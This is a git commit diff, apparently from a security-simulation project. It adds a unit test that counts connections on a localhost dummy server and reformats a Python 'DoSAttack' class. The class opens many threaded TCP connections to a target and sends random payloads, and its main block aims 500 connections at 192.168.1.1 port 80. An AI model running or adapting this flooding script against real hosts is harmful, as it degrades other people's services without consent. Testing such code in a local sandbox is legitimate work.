66e2adaf2fd29063618fd2d98ec6d264d9ca1149
NripeshN <nn2012@hw.ac.uk>
2023-07-23 18:02:35 +0530

    test and dos

--- Test/test_dos_attack.py
+++ Test/test_dos_attack.py
@@ -1,12 +1,50 @@
 import unittest
 from src import dos_attack
+import threading
+import socket
+
+
+class DummyServer:
+    def __init__(self, host="localhost", port=9999):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.bind((host, port))
+        self.sock.listen(1)
+        self.connections = []
+
+    def start(self):
+        while True:
+            conn, addr = self.sock.accept()
+            self.connections.append(conn)
+
+    def stop(self):
+        for conn in self.connections:
+            conn.close()
+        self.sock.close()
+
+    def connection_count(self):
+        return len(self.connections)
+
 
 class TestDoSAttack(unittest.TestCase):
-    def test_simulation(self):
-        # Instantiate the class
-        dos = dos_attack.DoSAttack("dummy_target")
+    def setUp(self):
+        self.server = DummyServer()
+        self.server_thread = threading.Thread(target=self.server.start)
+        self.server_thread.start()
 
-        # Test the simulate method
-        # You'll need to determine how to test this based on your implementation.
-        # This could involve checking the state of `dummy_target` before and after the simulation.
-        dos.simulate()
+    def tearDown(self):
+        self.server.stop()
+        self.server_thread.join()
+
+    def test_simulation(self):
+        dos = dos_attack.DoSAttack(
+            "localhost", 9999, 5
+        )  # target localhost, port 9999, 5 connections
+        initial_connections = self.server.connection_count()
+        dos.simulate_attack()
+        dos.wait_for_threads()
+        final_connections = self.server.connection_count()
+        self.assertEqual(final_connections - initial_connections, 5)
+
+
+if __name__ == "__main__":
+    unittest.main()
--- src/dos_attack.py
+++ src/dos_attack.py
@@ -5,13 +5,17 @@ import string
 import socket
 import threading
 
+
 class RandomStringGenerator(nn.Module):
     def __init__(self, length):
         super(RandomStringGenerator, self).__init__()
         self.length = length
-    
+
     def forward(self, x):
-        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=self.length))
+        return "".join(
+            random.choices(string.ascii_uppercase + string.digits, k=self.length)
+        )
+
 
 class DoSAttack:
     def __init__(self, target_ip, target_port, num_connections):
@@ -19,13 +23,7 @@ class DoSAttack:
         self.target_port = target_port
         self.num_connections = num_connections
         self.threads = []
-        if torch.cuda.is_available():
-            device = torch.device('cuda')
-        elif hasattr(torch.backends, 'mps') and torch.backends.mps.is_available():
-            device = torch.device('mps')
-        else:
-            device = torch.device('cpu')
-        self.model = RandomStringGenerator(100).to(device)
+        self.model = RandomStringGenerator(100)
 
     def simulate_attack(self):
         for _ in range(self.num_connections):
@@ -37,9 +35,9 @@ class DoSAttack:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((self.target_ip, self.target_port))
-            payload = self.model(torch.tensor([])).encode() # Generate payload
+            payload = self.model(torch.tensor([])).encode()  # Generate payload
             sock.send(payload)
-            sock.send(b'QUIT')
+            sock.send(b"QUIT")
             sock.close()
         except Exception as e:
             print(f"Exception occurred while creating a connection: {e}")
@@ -48,7 +46,10 @@ class DoSAttack:
         for thread in self.threads:
             thread.join()
 
+
 if __name__ == "__main__":
-    dos = DoSAttack("192.168.1.1", 80, 500)  # target IP, target port, number of connections
+    dos = DoSAttack(
+        "192.168.1.1", 80, 500
+    )  # target IP, target port, number of connections
     dos.simulate_attack()
     dos.wait_for_threads()
